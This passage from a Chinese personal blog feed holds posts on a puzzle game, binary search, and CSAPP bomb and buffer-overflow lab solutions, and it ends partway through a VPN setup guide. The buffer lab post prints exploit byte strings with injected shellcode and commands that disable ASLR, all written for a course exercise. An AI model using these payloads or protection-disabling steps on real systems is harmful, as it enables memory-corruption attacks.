brainfuck\n\n\n\n\n0x01 Multiply\n\n乘法，求得X * Y就可以得到答案了。\n\n算X：2, 3, 6, 18, 108, ?（1944，a(n) = a(n-1) * a(n-2)）\n\n算Y：生命、宇宙以及任何事情的终极答案——42\n\n算X * Y； 1944 * 42 = 81648\n\nanswer: 81648.html\n\nkeypoint:\n\n  the answer to life, the universe and everything（Google Calculator Knows，出自道格拉斯·亚当斯的小说《银河系漫游指南》，值得一读哦）\n\n\n\n\n0x02 Keyboard\n\n点开图是一个Wiki，讲的是Dvorak Simplified Keyboard。意思就是把下面的密文按照键盘替换。得到解密后的程序：\n\n\n  main() { printf(&amp;unix[“\\021%six\\012\\0”],(unix)[“have”]+”fun”-0x60);}\n\n\nGoogle一下：原来是C语言混乱大赛的代码。详细见keypoint，这里给出答案。\n\nanswer: unix.html\n\nkeypoint:\n\n  Dvorak Simplified Keyboard\n  About the code\n\n\n\n\n0x03 QR Code\n\n扫一下二维码，得到a-z的转换表[abcdefghijklmnopqrstuvwxyz] &lt;=&gt; [pvwdgazxubqfsnrhocitlkeymj]。替换下面的乱码得到问题：\n\n\n  Where there is a shell, there is a way. I expect you use the shell command to solve this problem, now, please try using the rot13 of “shell” to enter next level.\n\n\n用Rot13加密方法替换shell这个单词。嘛继续Wiki。\n\nanswer: furyy.html\n\nkeypoint:\n\n  ROT13\n\n\n\n\n0x04 Cat\n\n（这一关卡了很久，我都快绝望的时候在v2ex上看到了用Sublime正则查找，豁然开朗）\n\n题目中给的提示有两个，一个是标题很大的Palindrome（回文），还有一个是The answer has been lost in the source。View Source之后发现了注释掉的代码，800行。尝试用cat解密后发现了新的提示：You need to find the pattern of \"cat\"，告诉我们要看图片左边的那个8行的特征：\n\n\n  必须是Palindrome；\n  一个数字，一个大写，一个小写，提取出的都是小写字母。\n\n\n打开Sublime写个正则：([A-Z])([0-9])[a-z](\\2)(\\1)|([0-9])([A-Z])[a-z](\\6)(\\5)，得到了符合条件的表达式：\n\n\n  E1v1E \n4FaF4\n9XrX9\nO3i3O\n0MaM0\n4GbG4\nM5l5M\n0WeW0\nY0s0Y\n\n\n取出小写字母。\n\nanswer: variables.html\n\nkeypoint:\n\n  Regex Expression\n\n\n\n\n0x05 Variables\n\nKeep Going，点开图之后有新的网页，数字是32722。替换2014为32722，又出现了新的数字。猜测和以前的贴吧那种链接差不多，写个js搞定。\n\nanswer: tree.html\n\n\n\n0x06 Tree\n\n给了张图，写了一棵树的中序和后序遍历。还好电脑里有大二上学期数据结构的求先序的C++程序就跑了一下。得到树之后先序遍历得到数的深度最长的路径zWp8LGn01wxJ7。下面有一串小字openssl enc -aes-128-cbc -a -d -pass pass:???。经过Ricter菊苣指点，把U2FsdGVkX1+gxunKbemS2193vhGGQ1Y8pc5gPegMAcg=放入test.in中再用terminal执行：openssl enc -aes-128-cbc -a -d -pass pass:zWp8LGn01wxJ7 -in test.in -out test.out得到答案。\n\nanswer: nqueens.html\n\nkeypoint:\n\n  Tree Traversal\n  OpenSSL\n\n\n\n\n0x07 N Queens\n\n给了个code = 57138642发现就是图上的解答。提示要我们使用⑨皇后问题生成这个code。写个python暴力跑一下（python技术烂到家）：\n\n\n\n得到最后结果。\n\nanswer: 953172864.html\n\nkeypoint:\n\n  N皇后问题\n\n\n\n\n0x08 Excel Column\n\n26进制表示。求得COOLSHELL = 3×(26^8)+15×(26^7)+15×(26^6)+12×(26^5)+19×(26^4)+8×(26^3)+5×(26^2)+12×(26^1)+12 = 751743486376和SHELL = 19×(26^4)+8×(26^3)+5×(26^2)+12×(26^1)+12 = 8826856。两个除一下得到答案85165。结果进了这个网页还让我们再用字符表示，也是败了。\n\nanswer: duyo.html\n\nkeypoint:\n\n\n  数的N进制表示\n\n\n\n\n0x09 Fraternal Organisation\n\nGoogle搜索了两张图，原来是Pigpen Cipher。Wiki上说明这是一种加密方式（zxw大神说他给妹子写过情书）。根据下面的一张图得到最后的破解密文。\n\nanswer: helloworld.html\n\nkeypoint:\n\n\n  Pigpen Cipher\n\n\n\n\n0x0a Congratulations!\n\nUpdate：耗子说还有个迷。于是继续打开这个网页把图片down下来之后vim打开后发现了可以是一个rar（感觉就是个种子）。解包之后有个txt得到了最终的答案。\n\nanswer: DennisRitchie.html\n\n\n\n恭喜并不代表结束。从这次小小的活动中又一次知道了自己是如此的渣逼。(╯‵□′)╯︵┻━┻\n\n最后的Ranking是37，前后也做了快5个小时。卡在cat那一关太久了=。=\n\nWiki是个好东西，也要善于搜索。更重要的还是要平时积累啊~（摔）\n","excerpt":"某日，看到zyq女神在群里发了个链接说：有没有人玩这个游戏啊…\n\n","languages":null,"categories":["note"],"tags":[]},{"title":"金曜日のおはよう","permalink":"http://blog.cee.moe/kin-you-bi-no-o-ha-you.html","link":"http://blog.cee.moe/kin-you-bi-no-o-ha-you.html","date":"2014-12-12T00:00:00-08:00","modified":"2016-02-05T23:03:25-08:00","author":{"name":"Cee","url":"http://cee.moe/","email":"ceecirno@gmail.com"},"content":"\n","excerpt":"\n","languages":null,"categories":["dance"],"tags":[]},{"title":"Girls","permalink":"http://blog.cee.moe/girls.html","link":"http://blog.cee.moe/girls.html","date":"2014-11-17T00:00:00-08:00","modified":"2016-02-06T06:31:46-08:00","author":{"name":"Cee","url":"http://cee.moe/","email":"ceecirno@gmail.com"},"content":"\n","excerpt":"\n","languages":null,"categories":["dance"],"tags":[]},{"title":"从零开始","permalink":"http://blog.cee.moe/rebirth.html","link":"http://blog.cee.moe/rebirth.html","date":"2014-10-29T00:00:00-07:00","modified":"2015-08-03T05:01:58-07:00","author":{"name":"Cee","url":"http://cee.moe/","email":"ceecirno@gmail.com"},"content":"今天上午的早些时候升级 Ghost 到 0.5.3 的时候，挂了。\n\n之前也做了备份但是重新恢复后死活进不了管理员后台。\n\n趁着买了泛域名证书之后把博客重新搭了一下，搬家搬到了咱的新域名（cee.moe）。\n\n\n\n从无到有，从简单到复杂，从不懂到懂。\n\n希望能写出更高质量的博文，所以之前的文章如果还需要的话请Email我或者通过其他方式找到我，我再放上来。\n\n相信这是一个新的开始，又一次，从零开始。\n","excerpt":"今天上午的早些时候升级 Ghost 到 0.5.3 的时候，挂了。\n\n","languages":null,"categories":["note"],"tags":[]},{"title":"从二分查找谈起","permalink":"http://blog.cee.moe/talking-from-binary-search.html","link":"http://blog.cee.moe/talking-from-binary-search.html","date":"2014-10-03T00:00:00-07:00","modified":"2015-08-03T04:59:26-07:00","author":{"name":"Cee","url":"http://cee.moe/","email":"ceecirno@gmail.com"},"content":"前两天在 V2EX 上看到了这篇文章：挖个坑，作为 python 程序员，面试时要求手写二分查找，可以说不么。自己觉得作为一个正常的程序员，多多少少必须会点算法和数据结构，不仅仅要学会怎么用，也要知道是怎么实现的。与此同时《编程珠玑》的作者 Jon Bentley 也提到：\n\n\n  90%以上的程序员无法正确无误的写出二分查找代码。\n\n\n今天就谈一下和二分有关的一些算法。\n\n\n\n二分查找（Binary Search）\n问题\n二分查找又叫做折半查找。我们所碰到的问题也很简单：\n\n\n  对于一个已经排好序且元素唯一的数组，如何找到我们需要的值value？\n\n\n解决思路\n想法也很明了：通过不断缩小包含我们要找到的这个值value的范围，我们就能最终找到它。很明显，一开始的范围是整个数组长度，利用中间项的大小和value比较我们可以缩小一半的比较范围，以此类推直到我们找到这个value或者判断这个value不在数组中。通过每次一半一半的筛选，二分查找的时间复杂度就是O（logn）。\n\n（建议大家试着写一下二分查找的代码，看看自己会有什么问题）\n\n二分查找代码如下：\n\n\n\n注意到第五行，很多教科书会写 int mid = (left + right) / 2; 这样的取中间值的语句，但是在 left 和 right 都较大的时候会溢出。这个 Bug 在 java.util.Arrays 包中存在了 8 年，所以也希望大家注意下。取中间值可以写成 int mid = left + ((right - left) &gt;&gt; 1); 或者 int mid = right - ((right - left) &gt;&gt; 1);。\n\n了解了实现的过程，回头想一下为何可以不断的二分查找呢？原因也很简单：因为数组已经排好序了，也就是说这个数组满足单调性。这一点很重要，不满足的话也无从下手缩小查找范围的地方了。总之整个数组判断 f(a[i]) =&lt; value / f(a[i]) &gt;= value 的状态结果应该是这个样子的：\n\nNO ... ... NO NO YES YES ... ... YES\n\n\n\n应用\n二分查找的应用也很广泛，尤其是利用单调性这一点，可以利用他来猜测答案。具体的应用相信很多OJ菊苣都知道，渣渣在这里也就不谈了。\n\n快速幂（Exponentiation by squaring）\n问题\n问题很简单：\n\n\n  怎样计算一个数 N 的 K 次方？\n\n\n解决思路\n正常的话我们会用一个递归的思路去解决：\n\n\n\n这个递归算法再简单不过了，算法时间复杂度是 O（n）。但是如果指数非常大的时候，一方面我们无法用 int 来存储我们的整数了，另一方面计算量实在是太大了。\n\n快速幂算法就是为了解决这个问题，算法思路就是利用了二分法。对于奇数和偶数我们分开考虑即可。\n\n\n\n(非递归的也很好写，Have a try！）\n\n应用\n\n  和矩阵运算有关。计算递推数列 A(n) = C(1)A(n-1) + C(2)A(n-2) + ... + C(k)A(n-k)（其中C(i)为常数）时，若 n 较大的时候，我们往往把它转换成向量和矩阵的乘法进行操作，对矩阵求 n 次乘法往往会用到快速幂。\n  快速幂取模。在 RSA 加密中我们会用到 a^b mod c，当 a 和 b 很大的时候，使用 O（logn）的时间计算 a^b mod c 是非常有必要的，想法类似于快速幂，可自行实现一下。\n\n\n\n\n这篇文章希望大家能够看完后对二分思想有个比较清楚的认识，更希望大家不要写错二分查找哦ԅ(╹﹃╹ԅ)\n","excerpt":"前两天在 V2EX 上看到了这篇文章：挖个坑，作为 python 程序员，面试时要求手写二分查找，可以说不么。自己觉得作为一个正常的程序员，多多少少必须会点算法和数据结构，不仅仅要学会怎么用，也要知道是怎么实现的。与此同时《编程珠玑》的作者 Jon Bentley 也提到：\n\n","languages":null,"categories":["note"],"tags":[]},{"title":"Colorful World","permalink":"http://blog.cee.moe/colorful-world.html","link":"http://blog.cee.moe/colorful-world.html","date":"2014-08-29T00:00:00-07:00","modified":"2016-02-06T06:33:30-08:00","author":{"name":"Cee","url":"http://cee.moe/","email":"ceecirno@gmail.com"},"content":"\n","excerpt":"\n","languages":null,"categories":["dance"],"tags":[]},{"title":"Dear Assembly（3）","permalink":"http://blog.cee.moe/dear-assembly-3.html","link":"http://blog.cee.moe/dear-assembly-3.html","date":"2014-08-01T00:00:00-07:00","modified":"2015-08-03T04:56:36-07:00","author":{"name":"Cee","url":"http://cee.moe/","email":"ceecirno@gmail.com"},"content":"（大概是 Lab 三部曲）\n\n\n\nIntro\n\n引言的话我想推荐大家先去看 Ricter 菊苣的一篇文章：缓冲区溢出的 Hello World。\n\n这篇文章的话讲的是 32 位的软娘插屁系统下的缓存区溢出，所以你看到的寄存器还是 eax、ebx等等。\n\n今天给大家介绍的话还是主要是通过 64 位系统下的操作。毕竟寄存器数量翻了一番，位数也翻了一番，效率也更高了。最最最不同的就是汇编的代码也就是实现方式不同了。这里的话先讲一点基础知识(｢･ω･)｢。\n\n关于寄存器\n\n\n  \n    之前提到过，每个寄存器也是从 32 位升级到了 64 位。对于 64 位的寄存器 %rax，它的后 32 位就相当于原来的 %eax。\n  \n  \n    新增了 8 个用于存放参数和临时变量的寄存器 %r8 ~ r15。它们的后 32 位可用作 %r8d ~ %r15d。\n  \n  \n    所有的寄存器可以按照 8/16/32/64 位读取和写入数据。\n  \n  \n    增加了寄存器，减少了 push（压栈）和 pop（出栈）的次数。说明一下不同寄存器的作用：\n  \n\n\n\n  \n    %rax：保存返回值。\n  \n  \n    %rdi/%rsi/%rdx/%rcx/%r8/%r9：保存参数，最多可以保存 6 个参数，大于 6 个采取同 32 位的做法压栈。\n  \n  \n    %r10/%r11：调用函数（Caller）保存调用前环境参数。\n  \n  \n    %rsp：栈顶指针。\n  \n  \n    %rbp：基址指针。\n  \n  \n    %rbx：基地址。\n  \n  \n    %r12 ~ %r15：被调用函数（Callee）的临时变量。\n  \n\n\n关于内存\n\n\n  分为运行时栈（Stack），堆（Heap），数据（Data）和指令（Text）四部分：\n\n\n\n  \n    栈（Stack）：8MB的限制大小（IA32）。\n  \n  \n    堆（Heap）：动态分配，使用malloc/calloc/new函数。\n  \n  \n    数据（Data）：静态分配，部分只读，部分可读写。\n  \n  \n    指令（Text）：运行时机器指令，只读。\n  \n\n\n\n  四部分在内存中的位置由高到低。\n\n\nLevel 0\n\n最简单的 level 了。这个 level 前一定要把调用函数的机制搞懂。\n\nLevel 0 是希望在调用 test() 函数的时候利用内部的 getbuf() 使程序跳转到 smoke() 中继续执行。先来看看 getbuf() 函数的全貌：\n\n\n\nbuffer 的长度是 36 个 char，加上压栈时的 %rbx 和 %rbp，前面一共占用 36 + 16 = 52 个 byte，最后是 8 位的 return address。所以答案就是：\n\n\n  00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 （36 char）\n00 00 00 00 00 00 00 00 （%rbx）\n00 00 00 00 00 00 00 00 （%rbp）\n00 00 00 00 c0 10 40 00 （Return address，call smoke）\n（注意小端表示）\n\n\nLevel 1\n\n和 Level 0 的区别仅仅在于传递参数的时候有个 val 要替换成自己的 cookie。看一下调用的代码 fizz()：\n\n\n\n参数共 7 个，而且 val 正好是第 7 个。预备知识里面也提到了，对于一个函数最多可以在寄存器中存放 6 个参数，也就是说 val 此时是压栈存放的。类似于 Level 0，我们也就知道了 cookie 应该保存在哪里了：\n\n\n  00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 （36 char）\n00 00 00 00 00 00 00 00 （%rbx）\n00 00 00 00 00 00 00 00 （%rbp）\n00 00 00 00 70 10 40 00 （Return address，call fizz）\n00 00 00 00 （Alignment）\n00 00 00 00 00 00 00 00 0b 43 71 79 17 a7 27 37 （unsigned long long）\n\n\n这里 Alignment 的作用是为了让 unsigned long long 确保地址是 16 字节对齐。\n\nLevel 2\n\n从这关开始越来越有难度了，Level 2 是第二天睡醒起来的下午时间做的。bang() 这个函数和上面的 fizz() 很像，只不过参数变成了全局变量 global_value：\n\n\n\nHints 里面也提到了一些 tricks：\n\n\n  Do not attempt to use either a jmp or a call instruction to jump to the code for bang(). These instructions use PC-relative addressing, which is very tricky to set up correctly. Instead, push an address on the stack and use the retq instruction.\n\n\n不能通过 jmp 和 call 指令跳转，因为是和 Counter 相对寻址的。我们需要找到 bang() 的入口地址并且把 cookie 复制一份到 global_value 中。继续来看 bang() 函数的汇编函数：\n\n\n\n找到我们需要的函数入口 0x401020，cookie 的地址 0x602320，global_value 的地址 0x602308。这时我们需要写一段汇编来实现函数的跳转：\n\n\n  movabs 0x602320, %rax   ;自己用的直接是立即数\nmovabs %rax, 0x602308\npushq $0x401020\nretq\n\n\n生成对应的 .d 文件：\n\n\n  gcc -c bang.s\nobjdump -d bang.o &gt; bang.d\n\n\n写出最后的答案：\n\n\n  48 b8 0b 43 71 79 17 a7 27 37 48 a3 08 23 60 00 00 00 00 00 68 20 10 40 00 c3 （attack code, 26 bytes）\n00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 （26 bytes）\n00 00 a0 be ff ff ff 7f （%rax，where we read buffer）\n\n\nLevel 3\n\n最后一关，啊哈，Instruction 上又很邪恶地（This style of attack is tricky）写出了要求：要更改 %rbp 和返回地址来实现攻击。最终是需要我们在 getbuf() 函数中返回我们的 cookie 来调用 test()：\n\n\n\n思想其实和上一题类似，也是要写一段 attack code：\n\n\n  movabs $0x3727a7177971430b, %rax\t;复制cookie\nmovabs $0x7fffffffbf00, %rbp\t;更改%rbp\npushq  $0x400ef3\t;getbuf调用后的第一条指令，接着继续执行\nretq\n\n\n生成后写出答案：\n\n\n  48 b8 0b 43 71 79 17 a7 27 37 48 bd 00 bf ff ff ff 7f 00 00 68 f3 0e 40 00 c3 （attack code, 26 bytes）\n00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00（26 bytes）\n00 00 a0 be ff ff ff 7f （%rax，where we start comparing）\n撒花完工，55分到手~\n\n\nWhy Within Gdb\n\nInstruction 在 Level 2 里面提到了这么一段话：\n\n\n  For level 2, you will need to run your exploit within gdb for it to succeed. (the VM has special memory protection that prevents execution of memory locations in the stack. Since gdb works a little differently, it will allow the exploit to succeed.)\n\n\nLevel 3 也同样有类似的话：\n\n\n  For level 3, you will need to run your exploit within gdb for it to succeed.\n\n\n这是为什么呢？自己一开始表示很困惑，于是在 Forum 上提出了这个问题，很快就有个好心的同学回答了。\n\n我们知道对于大多数 GNU/Linux 的发行版都有内存保护机制。其中有一种用来保护内存不被攻击的方法叫做 Address Space Layout Randomization（ASLR，位址空间配置随机加载）。位址空间配置随机加载利用随机方式配置资料位址，让某些敏感资料（例如操作系统内核）能配置到一个恶意程式未能事先得知的位址，令攻击者难于进行攻击。在系统中，ASLR 是默认开启的，而 gdb 则默认禁用了 ASLR。所以我们编译后的 bufbomb 中的地址是可以被确认的，这也就解释了为什么在 gdb 中可以改写全局变量。\n\n如果想要在系统下执行，可以通过 sysctl kernel.randomize_va_space = 0 或者 echo 0 &gt; /proc/sys/kernel/randomize_va_space 来解除 ASLR，但是这里肯定不推荐这么做/w\\。\n\nReferences\n\n\n  \n    两篇在 32 位 Linux 下的解释也相当精彩：\n\n    \n      \n        CSApp Buffer Lab\n      \n      \n        CSApp Bufbomb Lab解题记录\n      \n    \n  \n  \n    当然还有 Ricter 菊苣的：\n\n    \n      缓冲区溢出的 Hello World\n    \n  \n  \n    什么是 ASLR：\n\n    \n      \n        Wikipedia\n      \n      \n        课本《深入理解计算机系统（原作第二版）》P180\n      \n    \n  \n  \n    GNU/Linux 下的缓存区溢出：\n\n    \n      \n        做个试验：简单的缓冲区溢出\n      \n      \n        Stack Smashing On A Modern Linux System\n      \n    \n  \n\n\n\n\n感谢观众姥爷们翻完了这篇毫无技术的文章。两次实验给自己带来了很多知识上的长进，甚至是做出来后的惊喜，也再一次深入了解了 C/C++ 的函数调用和 x86-64 下的汇编，算是对课堂知识的一次扩充。\n\n如果有机会的话之后的 lab 作业也会写点总结的文章。恩就这样~\n\n","excerpt":"（大概是 Lab 三部曲）\n\n","languages":null,"categories":["note"],"tags":[]},{"title":"Dear Assembly（2）","permalink":"http://blog.cee.moe/dear-assembly-2.html","link":"http://blog.cee.moe/dear-assembly-2.html","date":"2014-07-30T00:00:00-07:00","modified":"2015-08-03T04:49:03-07:00","author":{"name":"Cee","url":"http://cee.moe/","email":"ceecirno@gmail.com"},"content":"\n  继续我们的拆炸弹之旅~\n\n\n\n\nPhase_6\n\n作业的要求也就是做到 phase_5，但是很感兴趣所以继续往下做~\n\n\n\n代码如上。\n\n第 4 行的 strtol 函数：字符串按照 10 进制转换成长整形，这里不再赘述（就是得到输入的数）。并且第 5 行把它放在了 node0 中。\n\n目光投向第 12 行的 cmp（很重要啊混蛋！），%edx == *(%rax)，往上再看三行相当于 %rax = %rax + 8 做了 3 次，指针向后移动了三个 address 长度。再来分析 fun6 究竟做了什么：\n\n\n\n（fun6 就是长长长+看不懂！）\n\n尽管如此还是得继续，手写一下各个寄存器的转化，分析一下 fun6 的作用：排序。\n\n题目就转换成对所有数排序后第四个数是否等于输入的数，观察一下 node1 到 node9 ，答案也就出来了：\n\n\n  取 600 ~ 673（分别对应 node8 和 node6）中的任意一个整数\n\n\nSecret_Phase\n\n最好玩的莫过于做完了布置的作业继续探索了！Let’s Go On！\n\n说到 Secret Phase，第一次看到是因为用 x /32c 看格式化字符串的时候发现了：\n\n\n  austinpowers\n\n\n后来发现在每个 phase 做完后的 phase_defused 有个调用：\n\n\n\n顺藤摸瓜，看了一下地址在 0x401ec4 中的格式化字符串：\n\n\n  %d %s\n\n\n并且和 austinpowers 比较了。并且 0x603030 这个入口也就是第四题的输入，即在 ⑨ 后面加上 austinpowers 就进入了 secret_phase。\n\n最后来看一下 secret_phase 和调用的 fun7：\n\n\n\n\n\n这里建立了一棵树，他的数据结构就是节点自身和左右孩子。第 15 行的 cmp（跟你们说了很重要！）函数要求我们 fun7 的返回值是 3。画出树得到最后的答案：\n\n\n  107\n\n\n撒花，成绩就是 62.5/50 了！\n\nAbout GDB\n\n关于 gdb 这里也想谈谈。\n\n通过这次的 lab 作业提升了很多关于 gdb 调试的技巧。\n\n给大家列一些常用的命令吧~\n\ngdb &lt;file&gt;: 开始调试&gt;&lt;\n\nrun, quit: 开始和退出\n\nbreak func/*0x804820: 给 func 函数/在地址为 0x804820 处设置断点\n\ndelete/disable/enable 1: 删除/禁用/启用断点 1（自动标号）\n\nstepi: 执行一条指令\n\nnexti: 执行一条指令，但是在函数调用中不停止\n\nstep: 执行一条C指令\n\ndisassemble func/0x804820: 查看 func 函数/地址在 0x804820 的汇编语句\n\nprint /x $rip: 16进制输出PC\n\nprint /d $rip: 10进制输出PC\n\nprint /t $rip: 2进制输出PC\n\nx /[NUM][SIZE][FORMAT] where: 指定格式输出，NUM 位数，SIZE 代表每一位的大小（例如 b=byte，w=word，g=giant），FORMAT 代表格式（x，d，t），WHERE 代表地址。\n\ninfo r: 查看寄存器\n\nReferences\n\nCSAPP Bomb Lab\n\n\n\nWhat’s Next\n\n\n  下一篇会主要介绍一下 lab3 的缓存区攻击的作业。\n\n","excerpt":"\n  继续我们的拆炸弹之旅~\n\n\n","languages":null,"categories":["note"],"tags":[]},{"title":"Dear Assembly（1）","permalink":"http://blog.cee.moe/dear-assembly-1.html","link":"http://blog.cee.moe/dear-assembly-1.html","date":"2014-07-26T00:00:00-07:00","modified":"2015-08-03T02:48:10-07:00","author":{"name":"Cee","url":"http://cee.moe/","email":"ceecirno@gmail.com"},"content":"苦逼的暑假开始了。\n\n在 lcb 大神 的推荐下，毫不犹豫地在六月份就选了 Coursera 上的 CSAPP（Computer Systems: A Programmer’s Perspective）。一方面正好自己操作系统也学得很烂，所以趁这个暑假充实一下自己的暑假生活；另一方面，这 CSAPP 的课机会难得，不容错过啊。\n\n这篇文章的话，主要还是讲一下 Lab 2 的拆炸弹作业。俗话说：\n\n\n  DDL 是第一生产力！\n\n\n赶在 DDL 前两天，晚上花了 5 个小时终于做完了！\n\n本文分上下两篇，主要介绍一下 Assembly、gdb 的使用，还有拆炸弹的解题过程/w\\\n\n\n\nPhase_1\n\n反编译 phase_1 的代码 disassemble phase_1，得到：\n\n\n\n除去 1，7，8 行，关注剩下的 2 到 6 行。\n\n程序调用了 strings_not_equal() 函数，比较输入字符串与 0x401af8 指向的字符串是否相等。使用 x /sb 0x401af8 查看 0x401af8 指向的字符串，就得到了第一个答案：\n\n\n  Science isn’t about why, it’s about why not?\n\n\nphase_1 结束！\n\nPhase_2\n\n进入 phase_2，disassemble phase_2 得到：\n\n\n\n第七行调用 read_six_numbers 函数，disassemble read_six_numbers：\n\n\n\nread_six_numbers 调用了 sscanf，格式字符串由地址为 0x401eb2 中的格式解析。查看 0x401eb2 地址中的格式字符串，使用 x /sb 0x401eb2：\n\n\n  0x401eb2:\t “%d %d %d %d %d %d”\n\n\n回到 phase_2 中，我们要知道读完六个数之后做了什么，继续看第 8 行开始的代码。第 8 行让 rbp = rsp 并且注意到第⑨行中 r13 寄存器保存了 rsp + 12 （即 rbp + 12 ）的地址，以及第 12、13 行的 eax 取出了 rbp + 12 的数并且用 eax 和 rbp 两个寄存器之间的书比较是否相等。之后的第 17 行，rbp = rbp + 4，让指针往后走一个 int 的大小。看到这里也就知道了 phase_2 的含义：\n\n\n  输入数组 a[6] 后，比较是否是一个长度为 3 的循环数组。即是否满足 a[0] = a[3]，a[1] = a[4] 和 a[2] = a[5]。\n\n\n输入符合条件的六个数即可~难度也不是很大(｢･ω･)｢\n\nPhase_3\n\n开始进入比较有挑战性的 phase_3，同样使用 disassenmble phase_3：\n\n\n\n比之前更长了，不是么？\n\n观察一下函数的特征，尤其是 14 - 27行，Switch/Case 的跳转表，非常的明显！\n\n查看 sscanf 的格式字符串，x /sb 0x401ebe：\n\n\n  0x401ebe:\t “%d %d”\n\n\n输入两个数，第一个数用于 Switch/Case 分支判断，第二个数字则用于和 eax 的比较。注意到 11 行的 cmpl（每次都是你！）判断了 rsp + 12 中的数是否大于 7，也就是输入的第一个数是否大于 7（default 分支）：如果大于就引爆了炸弹，否则就进入不同的 case 。通过计算不同的组合我们可以很轻松的得到这道题的不同的 7 个解（一行一个解）：\n\n\n  0 535\n1 926\n2 214\n3 339\n4 119\n5 352\n6 919\n7 412\n\n\n当屏幕显示 Phase 3 cleared! 的时候，我们已经解决了一半的问题了！\n\nPhase_4\n\nMove on, 进入到 phase_4，disassemble phase_4：\n\n\n\n第 3 行查看 sscanf 的格式字符串，x /sb 0x401ec1：\n\n\n  0x401ec1:\t “%d”\n\n\n即输入一个数。将这个输入的数放入 edi 中调用了函数 func4。func4 的代码如下：\n\n\n\n7 - 13 行的主要说明了递归函数目的 f(x) = f(x-1) + f(x-2)，边际条件在第 5 和 6 行 f(1) = 1（Fibbonacci 数列)。\n\n回到原函数，14 行的 cmp 使用了返回值 eax 和 0x37 = 55 比较，题目意图也很明显了：n 等于几时，有 f(n) = 55。答案就是：\n\n\n  ⑨（这么写当然是错的）\n9\n\n\nPhase_5\n\n\n\n同样地先观察格式字符串，x /sb 0x401ebe：\n\n\n  0x401ebe:\t “%d %d”\n\n\n格式输入正确后跳转到第 10 行执行函数，这里一行一行解释。\n\n第 10 行，eax 存入地址为 rsp + 12 中的数，也就是第二个参数。11 - 12 行用这个数和 0xf 做了与操作，取出了最后两位并重新保存到 rsp + 12 中。13 行判断了这个数是不是 0xf，若是就引爆了炸弹，否则接下来进入循环。15 - 16 行的两个计数器 ecx 和 edx 清零。\n\n17 到 22 行由 jne 判断出这是一个循环。17 行的作用让 edx = edx + 1，马上 18 行 cltq 对 eax 进行符号扩展，在 19 行加载 rax * 4 + 0x401ba0 这个地址中的数到 eax 中。20 行 ecx 作为累加器加上 eax 中的数。21 行依旧判断 eax 这个数是不是 0xf，不是则进行循环。\n\n比较难理解的是 19 行 eax = *(rax * 4 + 0x401ba0) 即取出了起始地址为 0x401ba0 的数组中序号为 eax 的数放入 eax 中。根据 21 行判断数组大小，用 x /16wd 0x401ba0 查看一下 0x401ba0 开始的数组：\n\n\n  0x401ba0 array.3014:\t\t10\t2\t14\t7\n0x401bb0 array.3014+16:\t8\t12\t15\t11\n0x401bc0 array.3014+32:\t0\t4\t1\t13\n0x401bd0 array.3014+48:\t3\t9\t6\t5\n\n\n整理一下：\n\n\n  10 2 14 7 8 12 15 11 0 4 1 13 3 9 6 5\n\n\n跳出循环，第 24 行，判断 edx 即函数的循环次数是不是 0xc = 12；第 26 行判断了第二个参数是否等于 ecx 中的数。phase_5 也就被我们转化成了一道数组倒推问题。计算后得到答案：\n\n\n  7 93\n\n\n至此，作业要求的 5 个函数已经完成！（撒花）\n\n\n\nWhat’s Next\n\n\n  Phase 6\n  Secret Phase\n  Gdb Guide\n\n\n","excerpt":"苦逼的暑假开始了。\n\n","languages":null,"categories":["note"],"tags":[]},{"title":"Cisco IPSec VPN 配置小记","permalink":"http://blog.cee.moe/cisco-ipsec-vpn.html","link":"http://blog.cee.moe/cisco-ipsec-vpn.html","date":"2014-04-09T00:00:00-07:00","modified":"2016-01-28T07:11:16-08:00","author":{"name":"Cee","url":"http://cee.moe/","email":"ceecirno@gmail.com"},"content":"咳咳。部署团委的创青春网站(Under Construction 2333)，顺便弄了一下 Cisco 的 VPN。\n\n比想像中容易配置，主要参考了MartianZ 菊苣的 blog 和另一篇博文。\n\n\n\n安装 IPSec-Tools Racoon\n\n1\n2# apt-get install ipsec-tools\n# apt-get install racoon\n\n\n配置 IPSec-tools Racoon\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n41\n42\n43\n44\n45\n46# /etc/racoon/racoon.conf\n    \npath pre_shared_key \"/etc/racoon/psk.txt\";\npath certificate \"/etc/racoon/certs\";\n\nlisten {\n\tisakmp YOUR.IP.ADDRESS [500];\n\tisakmp_natt YOUR.IP.ADDRESS [4500];\n    #上两行 YOUR.IP.ADDRESS 改为 VPS 的外网地址\n}\n\nremote anonymous {\n\texchange_mode aggressive, main, base;\n\tmode_cfg on;\n\tproposal_check obey;\n\tnat_traversal on;\n\tgenerate_policy unique;\n\tike_frag on;\n\tpassive on;\n\tdpd_delay 30;\n\n\tproposal {\n   \t\tlifetime time 28800 sec;\n   \t\tencryption_algorithm 3des;\n    \thash_algorithm md5;\n    \tauthentication_method xauth_psk_server;\n    \tdh_group 2;\n\t}\n}\n\nsainfo anonymous {\n\tencryption_algorithm aes, 3des, blowfish;\n\tauthentication_algorithm hmac_sha1, hmac_md5;\n\tcompression_algorithm deflate;\n}\n\nmode_cfg {\n\tauth_source system;\n\tdns4 8.8.8.8;\n\tbanner \"/etc/racoon/motd\";\n\tsave_passwd on;\n\tnetwork4 10.1.1.100;#客户端获得的 IP 起始地址\n\tnetmask4 255.255.255.0;#客户端获得的地址的掩码\n\tpool_size 100;#最大客户端数量\n\tpfs_group 2;\n}\n\n\n1\n2\n3\n4\n5# /etc/racoon/psk.txt\n\nYOUR.GROUP.NAME YOUR.GROUP.SECRET \n# 前面是 Group Name，或者 vpnc 里配置的 IPSec ID\n# 后面是 Secret，或者 vpnc 里的 IPSec secret\n\n\n1\n2\n3\n4# /etc/racoon/motd\n\nFuck GFW!\n# 欢迎信息，貌似一定要填写？\n\n\n添加用户名和密码\n\n1\n2# useradd -MN -b /tmp -s /sbin/nologin YOUR.USERNAME \n# passwd YOUR.USERNAME\n\n\n设置 iptables 的规则和 